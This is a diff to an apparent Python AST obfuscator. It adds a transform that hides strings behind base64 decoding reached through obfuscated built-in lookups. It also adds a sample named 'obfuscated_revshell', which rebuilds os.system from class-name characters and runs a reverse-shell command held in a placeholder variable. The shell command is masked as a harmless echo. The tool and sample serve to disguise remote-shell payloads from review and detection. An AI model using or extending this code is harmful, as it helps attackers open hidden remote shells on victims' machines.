@@ -132,6 +132,81 @@ def obfuscate_string(s, placeholder=None):
                                                                                                           kind=None))),
                                                      ctx=Load())],
                                                  keywords=[]), attr='decode', ctx=Load()), args=[], keywords=[]),
+        lambda x: Call(func=Attribute(value=Call(func=Attribute(value=Call(func=Attribute(value=Call(
+            func=Call(func=Name(id='getattr', ctx=Load()), args=[Subscript(value=Attribute(
+                value=Subscript(value=Call(func=Name(id='globals', ctx=Load()), args=[], keywords=[]), slice=Index(
+                    value=BinOp(left=BinOp(left=BinOp(
+                        left=BinOp(left=Constant(value='_', kind=None), op=Mult(), right=Constant(value=2, kind=None)),
+                        op=Add(), right=Subscript(value=Constant(value='tliub', kind=None),
+                                                  slice=Slice(lower=None, upper=None, step=UnaryOp(op=USub(),
+                                                                                                   operand=Constant(
+                                                                                                       value=1,
+                                                                                                       kind=None))),
+                                                  ctx=Load())), op=Add(),
+                                           right=Subscript(value=Constant(value='sni', kind=None),
+                                                           slice=Slice(lower=None, upper=None, step=UnaryOp(op=USub(),
+                                                                                                            operand=Constant(
+                                                                                                                value=1,
+                                                                                                                kind=None))),
+                                                           ctx=Load())), op=Add(), right=BinOp(
+                        left=Call(func=Name(id='chr', ctx=Load()), args=[Constant(value=95, kind=None)], keywords=[]),
+                        op=Mult(), right=Constant(value=2, kind=None)))), ctx=Load()), attr='__dict__', ctx=Load()),
+                                                                           slice=Index(
+                                                                               value=Constant(value='__import__',
+                                                                                              kind=None)), ctx=Load()),
+                                                                 BinOp(left=BinOp(left=BinOp(left=BinOp(
+                                                                     left=Call(func=Name(id='chr', ctx=Load()),
+                                                                               args=[Constant(value=95, kind=None)],
+                                                                               keywords=[]), op=Mult(),
+                                                                     right=Constant(value=2, kind=None)), op=Add(),
+                                                                                             right=Subscript(
+                                                                                                 value=Constant(
+                                                                                                     value='ac',
+                                                                                                     kind=None),
+                                                                                                 slice=Slice(lower=None,
+                                                                                                             upper=None,
+                                                                                                             step=UnaryOp(
+                                                                                                                 op=USub(),
+                                                                                                                 operand=Constant(
+                                                                                                                     value=1,
+                                                                                                                     kind=None))),
+                                                                                                 ctx=Load())), op=Add(),
+                                                                                  right=BinOp(left=Constant(value='l',
+                                                                                                            kind=None),
+                                                                                              op=Mult(),
+                                                                                              right=Constant(value=2,
+                                                                                                             kind=None))),
+                                                                       op=Add(), right=BinOp(
+                                                                         left=Call(func=Name(id='chr', ctx=Load()),
+                                                                                   args=[Constant(value=95, kind=None)],
+                                                                                   keywords=[]), op=Mult(),
+                                                                         right=Constant(value=2, kind=None)))],
+                      keywords=[]), args=[Subscript(
+                value=Call(func=Attribute(value=Constant(value='', kind=None), attr='join', ctx=Load()), args=[ListComp(
+                    elt=Subscript(value=Name(id='i', ctx=Load()), slice=Slice(lower=None, upper=None,
+                                                                              step=UnaryOp(op=USub(),
+                                                                                           operand=Constant(value=1,
+                                                                                                            kind=None))),
+                                  ctx=Load()), generators=[comprehension(target=Name(id='i', ctx=Store()), iter=BinOp(
+                        left=Constant(value='46es', kind=None), op=Add(), right=Constant(value='ab', kind=None)),
+                                                                         ifs=[], is_async=0)])], keywords=[]),
+                slice=Slice(lower=None, upper=None, step=UnaryOp(op=USub(), operand=Constant(value=1, kind=None))),
+                ctx=Load())], keywords=[]), attr='__getattribute__', ctx=Load()), args=[
+            Call(func=Attribute(value=Constant(value='', kind=None), attr='join', ctx=Load()), args=[List(elts=[BinOp(
+                left=Subscript(value=Constant(value='ced46b', kind=None), slice=Slice(lower=None, upper=None,
+                                                                                      step=UnaryOp(op=USub(),
+                                                                                                   operand=Constant(
+                                                                                                       value=1,
+                                                                                                       kind=None))),
+                               ctx=Load()), op=Add(), right=Subscript(value=Constant(value='edo', kind=None),
+                                                                      slice=Slice(lower=None, upper=None,
+                                                                                  step=UnaryOp(op=USub(),
+                                                                                               operand=Constant(value=1,
+                                                                                                                kind=None))),
+                                                                      ctx=Load()))], ctx=Load())], keywords=[])],
+                                                                           keywords=[]), attr='__call__', ctx=Load()),
+                                                 args=[Constant(value=b64encode(x.encode()).decode(), kind=None)], keywords=[]), attr='decode',
+                                      ctx=Load()), args=[], keywords=[])
 
     ]
     # 'abc' -> 'cba'[::-1]
@@ -559,6 +634,11 @@ class ValidateGlobalVars(Obfuscator):
         node.body = [self.visit(x) for x in node.body]
         return node
 
+    def visit_Lambda(self, node: Lambda):
+        node.body = self.visit(node.body)
+        node.args = self.visit(node.args)
+        return node
+
     def visit_FunctionDef(self, node):
         if node in self.functions:
             return self.visit_classMethod(node)
@@ -572,6 +652,51 @@ class ValidateGlobalVars(Obfuscator):
 
 obf = Obfuscator()
 code = r"""
+
+obfuscated_revshell = (lambda _, __, ___, ____, _____, ______, _______, ________:
+    getattr(
+        __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
+        ().__class__.__eq__.__class__.__name__[__:__] +
+        [].__iter__().__class__.__name__[__]+{}.__iter__().__class__.__name__[_______]+
+        [].__iter__().__class__.__name__[__]+[].__iter__().__class__.__name__[______]+
+        ().__iter__().__class__.__name__[____]+[].__iter__().__class__.__dict__.__class__.__name__[round(_/2)]
+    )( f'{revshell} & echo ' +
+         (lambda _, __, ___: _(_, __, ___))(
+            lambda _, __, ___:
+                chr(___ % __) + str(_(_, __, ___ // __)) if ___ else
+                (lambda: _).__code__.co_lnotab,
+            _ << ________,
+            (((_____ << ____) + _) << ((___ << _____) - ___)) + (((((___ << __)
+            - _) << ___) + _) << ((_____ << ____) + (_ << _))) + (((_______ <<
+            __) - _) << (((((_ << ___) + _)) << ___) + (_ << _))) + (((_______
+            << ___) + _) << ((_ << ______) + _)) + (((_______ << ____) - _) <<
+            ((_______ << ___))) + (((_ << ____) - _) << ((((___ << __) + _) <<
+            __) - _)) - (_______ << ((((___ << __) - _) << __) + _)) + (_______
+            << (((((_ << ___) + _)) << __))) - ((((((_ << ___) + _)) << __) +
+            _) << ((((___ << __) + _) << _))) + (((_______ << __) - _) <<
+            (((((_ << ___) + _)) << _))) + (((___ << ___) + _) << ((_____ <<
+            _))) + (_____ << ______) + (_ << ___)
+        )
+    )
+)(
+    *(lambda _, __, ___: _(_, __, ___))(
+        (lambda _, __, ___:
+         [__(___[(lambda: _).__code__.co_nlocals])] +
+         _(_, __, ___[(lambda _: _).__code__.co_nlocals:]) if ___ else []
+         ),
+        lambda _: _.__code__.co_argcount,
+        (
+            lambda _: _,
+            lambda _, __: _,
+            lambda _, __, ___: _,
+            lambda _, __, ___, ____: _,
+            lambda _, __, ___, ____, _____: _,
+            lambda _, __, ___, ____, _____, ______: _,
+            lambda _, __, ___, ____, _____, ______, _______: _,
+            lambda _, __, ___, ____, _____, ______, _______, ________: _
+        )
+    )
+) 
 """
 tree = parse(code)
 r = obf.visit(tree)
